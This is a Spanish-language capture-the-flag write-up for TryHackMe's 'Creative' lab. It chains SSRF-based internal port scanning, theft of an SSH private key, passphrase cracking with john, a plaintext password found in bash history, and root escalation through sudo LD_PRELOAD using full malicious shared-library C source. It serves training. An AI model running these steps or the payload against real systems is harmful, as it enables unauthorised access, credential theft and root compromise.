# Creative — TryHackMe Writeup

**Dificultad:** Easy  
**OS:** Linux  
**Técnicas:** SSRF · Port Forwarding Interno · SSH Key Extraction · LD_PRELOAD Privesc

---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sVC -p- --min-rate 5000 $TARGET -oN service.txt
```

**Resultado relevante:**
```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http  nginx 1.18.0 (Ubuntu)
          → Redirige a http://creative.thm (Virtual Hosting)
```

El servidor usa **virtual hosting**, añadimos el dominio al `/etc/hosts`:

```bash
echo "$TARGET creative.thm" | sudo tee -a /etc/hosts
```

---

## 2. Enumeración Web

### Fuzzing de directorios

```bash
feroxbuster -u http://creative.thm \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  --status-codes 200,301
```

### Fuzzing de Virtual Hosts

Buscamos subdominios que no conozcamos aún:

```bash
gobuster vhost -u http://creative.thm \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

**Encontramos:** `beta.creative.thm` → Status 200

```bash
echo "$TARGET beta.creative.thm" | sudo tee -a /etc/hosts
```

### Análisis del subdominio

```bash
curl http://beta.creative.thm/
```

La página expone un **URL Tester**: un formulario que recibe una URL,
hace la petición desde el servidor y devuelve el contenido.
Esto es un vector claro de **SSRF (Server-Side Request Forgery)**.

---

## 3. Explotación — SSRF

### Confirmación del SSRF

```bash
curl -s -X POST "http://beta.creative.thm" \
  -d "url=http://127.0.0.1"
```

El servidor devuelve la web de `creative.thm` — confirma que está
haciendo peticiones internas desde sí mismo.

### Descubrimiento de puertos internos

Automatizamos el escaneo de todos los puertos via SSRF:

```bash
seq 1 65535 | xargs -P 100 -I{} bash -c '
  result=$(curl -s -m 1 -X POST "http://beta.creative.thm" \
    -d "url=http://127.0.0.1:{}" \
    -H "Content-Type: application/x-www-form-urlencoded")
  if ! echo "$result" | grep -qE "Dead|^$"; then
    echo "[OPEN] Puerto {}"
    echo "$result" | head -c 300
  fi
' 2>/dev/null
```

**Resultado:**
```
[OPEN] Puerto 1337
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"...>
→ Directory listing del sistema de archivos
```

El puerto **1337** expone internamente un **servidor HTTP con directory listing**,
no accesible desde fuera — solo reachable vía SSRF.

### Extracción de clave SSH privada

Navegamos el sistema de archivos a través del SSRF:

```bash
# Ver el directorio home
curl -s -X POST "http://beta.creative.thm" \
  -d "url=http://127.0.0.1:1337/home"

# Listar el home de saad
curl -s -X POST "http://beta.creative.thm" \
  -d "url=http://127.0.0.1:1337/home/saad/.ssh/"

# Descargar la clave privada SSH
curl -s -X POST "http://beta.creative.thm" \
  -d "url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa" > saad_key

chmod 600 saad_key
```

---

## 4. Acceso Inicial — SSH

```bash
ssh saad@$TARGET -i saad_key
```

La clave tiene **passphrase**. La crackeamos con john:

```bash
ssh2john saad_key > saad_key.hash
john saad_key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Passphrase encontrada:** `sweetness`

```bash
ssh saad@$TARGET -i saad_key
# Enter passphrase: sweetness
```

**User flag:**
```bash
cat ~/user.txt
```

---

## 5. Escalada de Privilegios

### Enumeración post-explotación

```bash
cat ~/.bash_history
```

El historial revela credenciales en texto plano:

```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt   ← intentó borrarlas pero el historial las guardó
```

### Análisis de sudo

```bash
sudo -l
# Password: MyStrongestPasswordYet$4291
```

**Resultado crítico:**
```
env_reset, env_keep+=LD_PRELOAD
(root) NOPASSWD: /usr/bin/ping
```

Dos configuraciones peligrosas en `/etc/sudoers`:

| Configuración | Problema |
|---|---|
| `env_keep+=LD_PRELOAD` | sudo NO elimina esa variable del entorno |
| `(root) /usr/bin/ping` | Saad puede ejecutar ping como root |

### LD_PRELOAD Privilege Escalation

**¿Por qué funciona?**

`LD_PRELOAD` permite cargar una librería `.so` antes que cualquier otra
al ejecutar un programa. Normalmente sudo la elimina, pero aquí está
explícitamente conservada (`env_keep`). Al ejecutar ping como root,
nuestra librería se carga con privilegios de root antes de que ping
arranque, dándonos una shell.

```
saad (usuario normal)
     │
     └─► sudo LD_PRELOAD=shell.so /usr/bin/ping
               │
               ▼
          Linux carga shell.so  ← nuestro código
               │
               ▼
          _init() → setuid(0) → setgid(0)
               │
               ▼
          /bin/bash -p  →  ROOT 🎯
```

**Exploit:**

```bash
# 1. Crear la librería maliciosa en C
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD"); // Limpiar para evitar bucles en procesos hijos
    setuid(0);              // Escalar UID a root
    setgid(0);              // Escalar GID a root
    system("/bin/bash -p"); // Lanzar bash manteniendo privilegios (-p)
}
EOF

# 2. Compilar como shared library (.so)
# -fPIC       → Position Independent Code (obligatorio para .so)
# -shared     → genera librería, no ejecutable
# -nostartfiles → sin main() estándar
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# 3. Ejecutar ping con nuestra librería precargada
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

**Verificación:**

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

---

## 6. Resumen de Vulnerabilidades

| # | Vulnerabilidad | Ubicación | Impacto |
|---|---|---|---|
| 1 | SSRF | beta.creative.thm | Acceso a servicios internos |
| 2 | Directory listing | Puerto interno 1337 | Lectura arbitraria de archivos |
| 3 | Credenciales en bash_history | ~/.bash_history | Contraseña de saad en texto plano |
| 4 | sudo env_keep+=LD_PRELOAD | /etc/sudoers | Escalada completa a root (CWE-426) |

---

## 7. Referencias

- [GTFOBins — LD_PRELOAD](https://gtfobins.github.io)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz)
- [CWE-426 — Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
---

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [gobuster](../../../tools/fuzz/gobuster.md)
- [john](../../../tools/creds/john.md)
- [ssrf-internal-port-scan](../../../exploits/web/ssrf-internal-port-scan.md)
- [sudo-ld-preload](../../../privesc/linux/sudo-ld-preload.md)
